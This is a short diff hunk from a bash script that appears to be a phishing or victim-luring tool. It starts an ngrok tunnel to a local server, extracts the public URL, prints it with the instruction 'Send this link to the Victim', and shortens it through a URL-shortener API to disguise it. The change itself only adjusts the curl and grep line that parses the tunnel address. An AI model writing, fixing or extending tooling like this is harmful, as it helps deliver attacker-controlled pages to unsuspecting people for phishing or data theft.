@@ -428,7 +428,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+link=$( curl -S -n http://127.0.0.1:4040/api/tunnels | grep -oE "https:\/\/[a-z0-9\-]*\.ngrok\.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 short_link=`wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=$link\&keyword=$2`
 printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
